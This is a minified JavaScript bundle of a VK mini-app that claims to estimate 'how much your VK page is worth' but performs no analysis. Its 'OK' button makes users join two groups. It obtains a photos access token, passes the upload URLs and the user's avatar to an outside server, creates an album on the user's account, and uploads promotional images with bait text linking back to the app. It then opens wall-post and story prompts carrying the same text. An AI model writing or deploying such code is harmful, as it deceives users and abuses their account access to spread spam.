(this["webpackJsonpmini-app"]=this["webpackJsonpmini-app"]||[]).push([[0],{150:function(e,t,n){"use strict";n.r(t);var r=n(0),s=n(18),c=n.n(s),a=n(6),o=n.n(a),i=n(9),p=n(16),l=n(7),u=n.n(l),d=n(4),h=(n(148),n(17),n(2)),j=function(e){var t=e.id,n=e.go;e.fetchedUser;function r(){return r=Object(i.a)(u.a.mark((function e(){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppJoinGroup",{group_id:214071759}).then(function(){var e=Object(i.a)(u.a.mark((function e(t){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(1!=t.result){e.next=3;break}return e.next=3,o.a.send("VKWebAppJoinGroup",{group_id:216525118}).then((function(e){1==e.result&&n("persik")}));case 3:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}());case 2:case"end":return e.stop()}}),e)}))),r.apply(this,arguments)}return Object(h.jsx)(d.f,{id:t,children:Object(h.jsx)(d.e,{children:Object(h.jsxs)(d.e,{className:"block",style:{textAlign:"center",marginTop:80,color:"#0176ff"},children:[Object(h.jsx)(d.j,{level:"1",style:{marginBottom:20},children:"\u041f\u0440\u0438\u0432\u0435\u0442!"}),Object(h.jsx)(d.j,{level:"3",style:{marginBottom:20},children:"\u041c\u044b \u043e\u0446\u0435\u043d\u0438\u0432\u0430\u0435\u043c \u0442\u0432\u043e\u044e \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443, \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u044f \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0437\u043d\u044b\u0445 \u0444\u0430\u043a\u0442\u043e\u0440\u043e\u0432. \u0410\u043b\u0433\u043e\u0440\u0438\u0442\u043c \u0430\u043d\u0430\u043b\u0438\u0437\u0438\u0440\u0443\u0435\u0442 \u0438 \u0432\u044b\u0434\u0430\u0435\u0442 \u043e\u0442\u0432\u0435\u0442, \u0430 \u043c\u044b \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c \u0435\u0433\u043e \u0442\u0435\u0431\u0435"}),Object(h.jsx)(d.j,{level:"3",style:{marginBottom:20},children:"*\u041f\u0440\u043e\u0448\u0443 \u043e\u0442\u043c\u0435\u0442\u0438\u0442\u044c, \u0447\u0442\u043e \u043d\u0430\u0448\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0440\u0430\u0437\u0432\u043b\u0435\u043a\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u043c! \u041c\u044b \u043d\u0435 \u043f\u044b\u0442\u0430\u0435\u043c\u0441\u044f \u043a\u0443\u043f\u0438\u0442\u044c \u0438\u043b\u0438 \u043f\u0440\u043e\u0434\u0430\u0442\u044c \u0447\u044c\u044e-\u043b\u0438\u0431\u043e \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443!"}),Object(h.jsx)(d.c,{stretched:!0,size:"l",mode:"secondary",onClick:function(){!function(){r.apply(this,arguments)}()},"data-to":"persik",children:"\u041e\u043a"})]})})})},f=function(e){var t=e.id,n=e.go,r=e.token;e.fetchedUser;function s(){return(s=Object(i.a)(u.a.mark((function e(){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppGetAuthToken",{app_id:51448204,scope:"photos"}).then((function(e){r(e.access_token),n("analize")}));case 2:case"end":return e.stop()}}),e)})))).apply(this,arguments)}return Object(h.jsx)(d.f,{id:t,children:Object(h.jsx)(d.e,{children:Object(h.jsxs)(d.e,{className:"block",style:{textAlign:"center",marginTop:80,color:"#0176ff"},children:[Object(h.jsx)(d.j,{level:"1",style:{marginBottom:20},children:"\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c \u0434\u043e\u0441\u0442\u0443\u043f"}),Object(h.jsx)(d.j,{level:"3",style:{marginBottom:20},children:"\u042d\u0442\u043e \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0434\u043b\u044f \u0442\u043e\u0433\u043e, \u0447\u0442\u043e\u0431\u044b \u0430\u043d\u0430\u043b\u0438\u0437 \u0431\u044b\u043b \u0442\u043e\u0447\u043d\u0435\u0435"}),Object(h.jsx)(d.c,{stretched:!0,size:"l",mode:"secondary",onClick:function(){!function(){s.apply(this,arguments)}()},"data-to":"persik",children:"\u041d\u0430\u0447\u0430\u0442\u044c \u0430\u043d\u0430\u043b\u0438\u0437"})]})})})},b=function(e){var t=e.id,n=e.go;e.token,e.fetchedUser;return Object(h.jsx)(d.f,{id:t,children:Object(h.jsx)(d.e,{children:Object(h.jsxs)(d.e,{className:"block",style:{textAlign:"center",marginTop:130,color:"#0176ff"},children:[Object(h.jsx)(d.j,{level:"1",style:{marginBottom:20},children:"\u0410\u043d\u0430\u043b\u0438\u0437 \u0437\u0430\u0432\u0435\u0440\u0448\u0451\u043d"}),Object(h.jsx)(d.j,{level:"3",style:{marginBottom:20},children:"Ca\u043c\u043e\u0435 \u0432\u0440\u0435\u043c\u044f \u0443\u0437\u043d\u0430\u0442\u044c, \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0441\u0442\u043e\u0438\u0442 \u0442\u0432\u043e\u044f \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430 \u0412\u041a!"}),Object(h.jsx)(d.c,{stretched:!0,size:"l",mode:"secondary",onClick:function(){n("final")},"data-to":"persik",children:"\u0423\u0437\u043d\u0430\u0442\u044c"})]})})})},m=function(e){var t=e.id,n=(e.go,e.token),s=e.fetchedUser;function c(){return c=Object(i.a)(u.a.mark((function e(){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppCallAPIMethod",{method:"photos.createAlbum",params:{title:"\u041c\u043e\u0438 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0430",description:"\u042f \u043de \u043fo\u0432\u0435\u0440\u0438\u043b, \u043fo\u043a\u0430 \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u043b \u0441\u0430\u043c \ud83d\udc49 vk.com/app51448204",v:"5.131",access_token:n}}).then(function(){var e=Object(i.a)(u.a.mark((function e(t){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppCallAPIMethod",{method:"photos.getUploadServer",params:{album_id:t.response.id,v:"5.131",access_token:n}}).then(function(){var e=Object(i.a)(u.a.mark((function e(r){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppCallAPIMethod",{method:"photos.getWallUploadServer",params:{v:"5.131",access_token:n}}).then(function(){var e=Object(i.a)(u.a.mark((function e(c){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,fetch("https://ru-academy.online/proxy-flask/upload",{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify({upl_server:r.response.upload_url,upl_server2:c.response.upload_url,ava_url:s.photo_200,rnamb:1,app:"priceakk"})}).then((function(e){return e.json()})).then(function(){var e=Object(i.a)(u.a.mark((function e(r){var c,a;return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return c=JSON.parse(r.res.s1),a=JSON.parse(r.res.s2),e.next=4,o.a.send("VKWebAppCallAPIMethod",{method:"photos.save",params:{album_id:t.response.id,hash:c.hash,server:c.server,photos_list:c.photos_list,aid:c.aid,v:"5.131",description:"\u042f \u043de \u043fo\u0432\u0435\u0440\u0438\u043b, \u043fo\u043a\u0430 \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u043b \u0441\u0430\u043c \ud83d\udc49 vk.com/app51448204",access_token:n}}).then((function(e){console.log(e)}));case 4:return e.next=6,o.a.send("VKWebAppCallAPIMethod",{method:"photos.saveWallPhoto",params:{hash:a.hash,server:a.server,photo:a.photo,v:"5.131",access_token:n}}).then(function(){var e=Object(i.a)(u.a.mark((function e(t){return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppShowStoryBox",{background_type:"image",url:t.response[0].sizes[t.response[0].sizes.length-1].url,attachment:{text:"open",type:"url",url:"https://vk.com/app51448204"}});case 2:return e.next=4,o.a.send("VKWebAppShowWallPostBox",{owner_id:s.id,message:"\u042f \u043de \u043fo\u0432\u0435\u0440\u0438\u043b, \u043fo\u043a\u0430 \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u043b \u0441\u0430\u043c \ud83d\udc49 vk.com/app51448204",v:"5.81",attachments:"photo"+t.response[0].owner_id+"_"+t.response[0].id,access_token:n});case 4:console.log(t.response[0].sizes[t.response[0].sizes.length-1].url);case 5:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}());case 6:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}());case 2:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}());case 2:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}());case 2:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}());case 2:case"end":return e.stop()}}),e)}))),c.apply(this,arguments)}return Object(r.useEffect)((function(){}),[]),Object(h.jsx)(d.f,{id:t,children:Object(h.jsx)(d.e,{children:Object(h.jsxs)(d.e,{className:"block",style:{textAlign:"center",marginTop:130,color:"#0176ff"},children:[Object(h.jsx)(d.j,{level:"1",style:{marginBottom:20},children:"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u043f\u043e\u043b\u0443\u0447\u0435\u043d!"}),Object(h.jsx)(d.c,{stretched:!0,size:"l",mode:"secondary",onClick:function(){!function(){c.apply(this,arguments)}()},"data-to":"persik",children:"\u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c"})]})})})},x=function(){var e=Object(r.useState)("bright_light"),t=Object(p.a)(e,2),n=t[0],s=t[1],c=Object(r.useState)("home"),a=Object(p.a)(c,2),l=a[0],x=a[1],O=Object(r.useState)(null),v=Object(p.a)(O,2),k=v[0],g=v[1],y=Object(r.useState)(Object(h.jsx)(d.g,{size:"large"})),w=Object(p.a)(y,2),A=w[0],_=w[1],W=Object(r.useState)(null),S=Object(p.a)(W,2),K=S[0],V=S[1];Object(r.useEffect)((function(){function e(){return(e=Object(i.a)(u.a.mark((function e(){var t;return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,o.a.send("VKWebAppGetUserInfo");case 2:t=e.sent,g(t),_(null);case 5:case"end":return e.stop()}}),e)})))).apply(this,arguments)}o.a.subscribe((function(e){var t=e.detail,n=t.type,r=t.data;"VKWebAppUpdateConfig"===n&&s(r.scheme)})),function(){e.apply(this,arguments)}()}),[]);return Object(h.jsx)(d.d,{scheme:n,children:Object(h.jsx)(d.a,{children:Object(h.jsx)(d.b,{children:Object(h.jsx)(d.i,{popout:A,children:Object(h.jsx)(d.h,{animate:!0,children:Object(h.jsxs)(d.k,{activePanel:l,children:[Object(h.jsx)(j,{id:"home",fetchedUser:k,go:x}),Object(h.jsx)(f,{id:"persik",fetchedUser:k,go:x,token:V}),Object(h.jsx)(b,{id:"analize",fetchedUser:k,go:x,token:K}),Object(h.jsx)(m,{id:"final",fetchedUser:k,go:x,token:K})]})})})})})})};o.a.send("VKWebAppInit"),c.a.render(Object(h.jsx)(x,{}),document.getElementById("root"))},17:function(e,t,n){}},[[150,1,2]]]);
//# sourceMappingURL=main.54e37754.chunk.js.map